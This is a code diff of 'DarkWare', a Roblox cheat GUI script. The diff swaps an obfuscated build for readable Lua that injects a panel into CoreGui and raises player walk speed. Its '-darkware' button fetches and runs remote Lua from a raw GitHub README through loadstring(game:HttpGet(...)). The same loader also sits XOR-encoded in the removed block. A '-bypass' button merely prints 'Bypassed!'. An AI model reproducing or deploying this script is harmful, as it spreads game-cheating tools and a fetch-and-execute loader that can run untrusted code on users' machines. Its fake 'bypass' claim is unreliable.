@@ -1,12 +1,161 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 
+-- By Skylex?
 
-]]--
+local ScreenGui = Instance.new("ScreenGui")
+local MainBox = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local hub = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v78,v79)local v80={};for v94=1, #v78 do v6(v80,v0(v4(v1(v2(v78,v94,v94 + 1)),v1(v2(v79,1 + ((v94-1)% #v79),1 + ((v94-1)% #v79) + 1)))%256));end return v5(v80);end local v8=Instance.new(v7("\198\231\95\133\216\78\171\224\237","\149\132\45\224\189\32\236"));local v9=Instance.new(v7("\142\208\245\28\77","\200\162\148\113\40\56\73"));local v10=Instance.new(v7("\233\1\34\68\165\6\62\206","\188\72\97\43\215\104\91"));local v11=Instance.new(v7("\58\136\247\208\34\140\237\193\2","\110\237\143\164"));local v12=Instance.new(v7("\125\156\168\30\90\187\142\3","\40\213\235\113"));local v13=Instance.new(v7("\254\31\230\208\233\251\200\31\242","\170\122\158\164\165\154"));local v14=Instance.new(v7("\150\150\193\135\248\88\48\35","\195\223\130\232\138\54\85\81"));local v15=Instance.new(v7("\246\55\199\7\224\39\203\7\205\60","\162\82\191\115"));local v16=Instance.new(v7("\7\23\151\141\230\238\127\56","\82\94\212\226\148\128\26\74"));local v17=Instance.new(v7("\116\203\254\176\162\241\68\6\79\192","\32\174\134\196\224\132\48\114"));local v18=Instance.new(v7("\238\247\119\93\201\208\81\64","\187\190\52\50"));local v19=Instance.new(v7("\132\133\179\37\145\98\38\164\143\165","\208\224\203\81\211\23\82"));local v20=Instance.new(v7("\109\57\220\71\26\6\113\74","\56\112\159\40\104\104\20"));v8.v21=game.CoreGui;v9.v22=v7("\131\197\62\46\59\170\101","\206\164\87\64\121\197\29");v9.v23=v8;v9.v24=Color3.fromRGB(459 -283,128 + 2,200 + 55);v9.v25=UDim2.new(0.162534401,0,0.387301594 -0,0);v9.v26=UDim2.new(638 -(617 + 21),323,0 + 0,458 -(96 + 146));v10.v27=v9;v11.v28=v9;v11.v29=Color3.fromRGB(255,48 -38,14);v11.v30=Color3.fromRGB(984 -(372 + 467),144 + 111,0 + 0);v11.v31=UDim2.new(0,0 -0,0.152423292 -0,0 -0);v11.v32=UDim2.new(0 + 0,70 + 253,0 + 0,16);v11.v33=Enum.Font.SourceSans;v11.v34=v7("","\185\19\194\194\34");v11.v35=Color3.fromRGB(0 + 0,0 -0,0 + 0);v11.v36=12 + 2;v12.v37=v11;v13.v38=v9;v13.v39=Color3.fromRGB(1033 -(102 + 831),202 -102,100);v13.v40=UDim2.new( -(0.000338759273 + 0),0, -(0.00158762047 -0),1698 -(39 + 1659));v13.v41=UDim2.new(287 -(246 + 41),315 -164,0 -0,23);v13.v42=Enum.Font.Unknown;v13.v43=v7("\147\170\249\126\101\163\25\178","\215\203\139\21\50\194\107");v13.v44=Color3.fromRGB(86 -48,738 -483,0);v13.v45=14;v14.v46=v13;v15.v47=v9;v15.v48=Color3.fromRGB(17,1651 -(681 + 970),541 -286);v15.v49=UDim2.new(1948.0362102389 -(245 + 1703),1297 -(103 + 1194),629.283196628 -(456 + 173),0);v15.v50=UDim2.new(0,107,0 -0,58 -32);v15.v51=Enum.Font.SourceSans;v15.v52=v7("\100\207\161\6\209\58\216\173\21\208\105\243\137\37\224\6\245","\73\168\200\112\180");v15.v53=Color3.fromRGB(0 + 0,0,0 -0);v15.v54=940 -(793 + 133);v15.MouseButton1Click:Connect(function()print(v7("\96\211\231\68\67\154\194\81\66\223\245\0","\39\186\145\33"));end);v16.v55=v15;v17.v56=v7("\140\19\133","\228\102\231\169\88\116\59");v17.v57=v9;v17.v58=Color3.fromRGB(2 + 15,441 -(396 + 45),371 -116);v17.v59=UDim2.new(0.0362102389 -0,0 + 0,0.491529942,0 -0);v17.v60=UDim2.new(0 -0,393 -(174 + 112),0,1569 -(1359 + 184));v17.v61=Enum.Font.SourceSans;v17.v62=v7("\66\18\222\67\4\1\222\67\10","\111\118\191\49");v17.v63=Color3.fromRGB(364 -(263 + 101),0,0 -0);v17.v64=14;v17.MouseButton1Click:Connect(function()loadstring(game:HttpGet(v7("\119\0\40\68\31\37\91\115\70\13\104\90\59\93\24\119\1\62\65\31\122\6\63\91\2\107\17\50\64\66\124\27\49\27\31\122\24\57\87\24\122\16\41\71\9\109\27\49\83\95\43\71\115\90\9\104\91\49\85\5\113\91\14\113\45\91\57\25\26\1\123","\31\116\92\52\108")))();end);v18.v65=v17;v19.v66=v9;v19.v67=Color3.fromRGB(48 -31,0,115 + 140);v19.v68=UDim2.new(0.466550797 + 0,0 + 0,0.283196628 + 0,0);v19.v69=UDim2.new(0,157 -50,0,26);v19.v70=Enum.Font.SourceSans;v19.v71=v7("\190\48\44\144\46\224\33","\147\82\85\224\79");v19.v72=Color3.fromRGB(0 + 0,0 -0,0);v19.v73=14;v19.MouseButton1Click:Connect(function()print(v7("\91\96\76\178\64\106\124\88\242","\25\25\60\211\51"));end);v20.v74=v19;local function v75()local v81=0 + 0;local v82;local v83;while true do if (v81==(1 -0)) then while true do if (v82==(0 -0)) then v83=Instance.new(v7("\242\44\31\143\209\59","\161\79\109\230"),v15);speed=27 + 3;v82=1;end if (v82==(890 -(734 + 155))) then function onPlayerRespawned(v101)local v104=0 -0;local v105;local v106;while true do if (v104==0) then wait(1 + 0);v105=game.Players:GetPlayerFromCharacter(v101);v104=398 -(371 + 26);end if ((2 -1)==v104) then v106=v101:findFirstChild(v7("\59\185\185\223\242\12\35\23","\115\204\212\190\156\99\74"));if ((v105~=nil) and (v106~=nil)) then v106.v107=speed;end break;end end end game.Workspace.ChildAdded:connect(onPlayerRespawned);break;end end break;end if (v81==0) then v82=0 + 0;v83=nil;v81=2 -1;end end end coroutine.wrap(v75)();local function v76()local v84=0;local v85;local v86;local v87;local v88;local v89;local v90;local v91;local v92;while true do if (v84==(3 + 0)) then v87.InputBegan:Connect(function(v95)if ((v95.UserInputType==Enum.UserInputType.MouseButton1) or (v95.UserInputType==Enum.UserInputType.Touch)) then local v102=0 + 0;local v103;while true do if (v102==(728 -(349 + 379))) then v103=0;while true do if (v103==(1 + 0)) then v91=v87.Position;v95.Changed:Connect(function()if (v95.UserInputState==Enum.UserInputState.End) then v88=false;end end);break;end if (v103==(0 -0)) then local v108=0 -0;while true do if (v108==(0 -0)) then v88=true;v90=v95.Position;v108=1 + 0;end if (v108==(1 + 0)) then v103=1 + 0;break;end end end end break;end end end end);v86.InputChanged:Connect(function(v96)if ((v96.UserInputType==Enum.UserInputType.MouseMovement) or (v96.UserInputType==Enum.UserInputType.Touch)) then if v88 then v92(v96);end end end);break;end if (v84==(1 + 1)) then v91=nil;v92=nil;function v92(v97)local v98=0;local v99;local v100;while true do if (v98==1) then game:GetService(v7("\212\48\30\196\238\20\30\211\246\46\24\196","\128\71\123\161")):Create(v87,TweenInfo.new(v89),{[v7("\197\163\242\60\234\209\136\3","\149\204\129\85\158\184\231\109")]=v100}):Play();break;end if (v98==(0 -0)) then v99=v97.Position-v90;v100=UDim2.new(v91.X.Scale,v91.X.Offset + v99.X,v91.Y.Scale,v91.Y.Offset + v99.Y);v98=1 -0;end end end v84=3;end if (v84==1) then v88=nil;v89=1975 -(1136 + 839);v90=nil;v84=5 -3;end if (v84==0) then v85=Instance.new(v7("\137\181\2\240\83\55\117\183\179\17\229","\197\218\97\145\63\100\22"),v9);v86=game:GetService(v7("\223\146\116\152\239\214\250\148\101\185\195\202\252\136\114\143","\138\225\17\234\166\184"));v87=v85.Parent;v84=2 -1;end end end coroutine.wrap(v76)();local function v77()local v93=Instance.new(v7("\38\247\218\45\21\31","\117\148\168\68\101\107\86\73"),v17);end coroutine.wrap(v77)();
+
+
+ScreenGui.Parent = game.CoreGui
+
+MainBox.Name = "MainBox"
+MainBox.Parent = ScreenGui
+MainBox.BackgroundColor3 = Color3.fromRGB(176, 130, 255)
+MainBox.Position = UDim2.new(0.162534401, 0, 0.387301594, 0)
+MainBox.Size = UDim2.new(0, 323, 0, 216)
+
+UICorner.Parent = MainBox
+
+TextLabel.Parent = MainBox
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 10, 14)
+TextLabel.BorderColor3 = Color3.fromRGB(145, 255, 0)
+TextLabel.Position = UDim2.new(0, 0, 0.152423292, 0)
+TextLabel.Size = UDim2.new(0, 323, 0, 16)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = ""
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+UICorner_2.Parent = TextLabel
+
+TextLabel_2.Parent = MainBox
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+TextLabel_2.Position = UDim2.new(-0.000338759273, 0, -0.00158762047, 0)
+TextLabel_2.Size = UDim2.new(0, 151, 0, 23)
+TextLabel_2.Font = Enum.Font.Unknown
+TextLabel_2.Text = "DarkWare"
+TextLabel_2.TextColor3 = Color3.fromRGB(38, 255, 0)
+TextLabel_2.TextSize = 14.000
+
+UICorner_3.Parent = TextLabel_2
+
+TextButton.Parent = MainBox
+TextButton.BackgroundColor3 = Color3.fromRGB(17, 0, 255)
+TextButton.Position = UDim2.new(0.0362102389, 0, 0.283196628, 0)
+TextButton.Size = UDim2.new(0, 107, 0, 26)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "-givespeed [AUTO]"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.MouseButton1Click:Connect(function()
+	print("Gived Speed!")
+end)
+
+UICorner_4.Parent = TextButton
+
+hub.Name = "hub"
+hub.Parent = MainBox
+hub.BackgroundColor3 = Color3.fromRGB(17, 0, 255)
+hub.Position = UDim2.new(0.0362102389, 0, 0.491529942, 0)
+hub.Size = UDim2.new(0, 107, 0, 26)
+hub.Font = Enum.Font.SourceSans
+hub.Text = "-darkware"
+hub.TextColor3 = Color3.fromRGB(0, 0, 0)
+hub.TextSize = 14.000
+hub.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/selecteduseromg343/new/main/README.md"))()
+end)
+
+UICorner_5.Parent = hub
+
+TextButton_2.Parent = MainBox
+TextButton_2.BackgroundColor3 = Color3.fromRGB(17, 0, 255)
+TextButton_2.Position = UDim2.new(0.466550797, 0, 0.283196628, 0)
+TextButton_2.Size = UDim2.new(0, 107, 0, 26)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "-bypass"
+TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.TextSize = 14.000
+TextButton_2.MouseButton1Click:Connect(function()
+	print("Bypassed!")
+end)
+
+
+UICorner_6.Parent = TextButton_2
+
+-- BySkylex
+-- Leak + blacklist!
+
+local function EAFVJMN_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+
+	speed = 30 --16 is default
+	
+	function onPlayerRespawned(character)
+		wait(1) --loading delay
+		local player = game.Players:GetPlayerFromCharacter(character)
+		local human = character:findFirstChild("Humanoid")
+		if player ~= nil and human ~= nil then
+			human.WalkSpeed = speed
+		end
+	end
+	
+	game.Workspace.ChildAdded:connect(onPlayerRespawned)
+end
+coroutine.wrap(EAFVJMN_fake_script)()
+local function TDYJTZ_fake_script() -- MainBox.LocalScript 
+	local script = Instance.new('LocalScript', MainBox)
+
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+	
+end
+coroutine.wrap(TDYJTZ_fake_script)()
+local function OOGCFG_fake_script() -- hub.Script 
+	local script = Instance.new('Script', hub)
+
+	
+end
+coroutine.wrap(OOGCFG_fake_script)()
